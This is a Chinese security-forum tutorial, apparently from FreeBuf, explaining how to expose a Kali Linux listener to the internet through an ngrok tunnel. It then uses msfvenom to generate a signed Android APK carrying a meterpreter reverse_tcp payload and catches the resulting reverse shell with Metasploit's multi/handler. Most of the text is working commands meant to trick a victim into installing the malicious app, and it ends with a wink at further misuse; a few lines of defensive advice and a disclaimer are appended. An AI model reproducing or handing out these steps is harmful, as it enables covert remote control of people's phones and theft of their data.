@@ -1,0 +1,37 @@
+*本文原创作者：艾登——皮尔斯，本文属FreeBuf原创奖励计划，未经许可禁止转载
+前言:
+因为之前作为小白我不会在Kali Linux里面把IP映射出外网，卡在那个地方很久，后来解决了这个问题就写方法出来和大家分享分享。
+环境：
+Kali Linux系统(https://www.kali.org/downloads/)
+Metasploit
+Ngrok Linux64位的端口转发工具(https://www.ngrok.cc/)
+1.在Kali Linux里面打开https://www.ngrok.cc,下载里面的Linux 64位的端口转发工具，到Kali Linux桌面备用
+然后小伙伴需要自己去https://www.ngrok.cc/注册一个帐号来开通一个免费的隧道，用于接下来的端口映射。
+2.设置隧道:
+隧道协议选择TCP的，本地端口输入Kali Linux 的IP地址而端口号可以任意不要冲突就行了
+设置好ngrok隧道之后就打开指定的sunny路径运行端口转发脚本。
+./sunny clientid id
+这个是端口转发脚本成功运行的样子
+3. 用Metasploit生成载有恶意Payload的Android的apk并且签名apk：
+在Kali Linux里面打开一个新的窗口输入
+msfvenom -p android/meterpreter/reverse_tcp LHOST=free.ngrok.cc LPORT=11*** R > /root/Desktop/123.apk
+执行下列命令签名。首先使用密钥工具创建密钥库。
+keytool -genkey -v -keystore my-release-key.Keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
+然后使用JARsigner签名APK
+jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.Keystore 123.apk aliasname
+再用JARsigner验证签名
+jarsigner -verify -verbose -certs 123.apk
+如果你嫌上面的签名apk的步骤很麻烦就直接在手机下载一个MT管理器进行对apk的签名既方便又快捷。
+4.使用Metasploit进行测试：
+接下来启动metasploit的监听器。执行msfconsole打开控制台。
+use exploit/multi/handler Set PAYLOAD android/meterpreter/reverse_tcp SET LHOST 192.168.253.128(Kali的Linux内网IP) SET LPORT 2222(隧道的端口号) Exploit
+然后将载有payload的APK发送到手机上安装等待反弹shell
+接受反弹shell成功
+sessions查看反弹shell
+sessions -i [ID]进行回话操作
+剩下的大家应该知道怎么做了(眼神暗示)
+注:如果你Kali linux的内网IP变了，可以直接在隧道修改成你的内网IP然后在set LHOST设置成你内网IP然后run监听即可。
+防范方法：
+1. 手机没事尽量不要root。 2. 定期更新手机病毒库，并且进行杀毒。 3. 对于一些app申请的不必要的权限可以给予禁止。 4. 手机直接安装个杀毒软件。
+声明：本文仅供技术交流，请勿利用本文章的攻击手法对他人进行攻击，出现一切法律纠纷，与本文作者无关。
+*本文原创作者：艾登——皮尔斯，本文属FreeBuf原创奖励计划，未经许可禁止转载
